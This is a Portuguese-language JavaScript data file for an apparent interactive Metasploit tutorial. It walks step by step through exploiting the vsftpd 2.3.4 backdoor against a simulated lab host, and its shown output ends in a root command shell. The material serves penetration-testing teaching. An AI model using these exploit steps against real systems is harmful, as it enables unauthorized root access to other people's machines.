
export const data = {
    id: "msfconsole",
    title: "Metasploit Framework: Exploração Avançada",
    intro: "O Metasploit Framework é a ferramenta de teste de penetração mais utilizada no mundo. Ele permite encontrar, validar e explorar vulnerabilidades em sistemas.",
    steps: [
        {
            step: 1,
            instruction: "Para começar, precisamos iniciar o console do Metasploit. Este é o ambiente interativo onde toda a mágica acontece.",
            command: "msfconsole -q",
            hint: "A flag -q inicia em modo 'quiet' (sem o banner ASCII gigante).",
            output: `msf6 >`
        },
        {
            step: 2,
            instruction: "Vamos procurar por exploits relacionados ao serviço vsftpd 2.3.4, conhecido por ter uma backdoor.",
            command: "search vsftpd",
            hint: "Use o comando search seguido do termo.",
            output: `Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution`
        },
        {
            step: 3,
            instruction: "Selecione o exploit encontrado para configurar o ataque.",
            command: "use 0",
            hint: "Você pode usar o índice numérico (0) ou o caminho completo.",
            output: `[*] No payload configured, defaulting to cmd/unix/interact`
        },
        {
            step: 4,
            instruction: "Agora precisamos definir o alvo (Remote Host). O IP do nosso alvo simulado é 192.168.56.101.",
            command: "set RHOSTS 192.168.56.101",
            hint: "O comando set define variáveis do módulo.",
            output: `RHOSTS => 192.168.56.101`
        },
        {
            step: 5,
            instruction: "Tudo pronto. Execute o exploit para obter acesso ao sistema.",
            command: "exploit",
            hint: "Use exploit ou run para iniciar o ataque.",
            output: `[*] 192.168.56.101:21 - Banner: (vsFTPd 2.3.4)
[*] 192.168.56.101:21 - USER: 331 Please specify the password.
[+] 192.168.56.101:21 - Backdoor service has been spawned, handling...
[+] 192.168.56.101:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.56.1:4444 -> 192.168.56.101:6200) at 2024-01-10 15:30:05`
        }
    ]
};
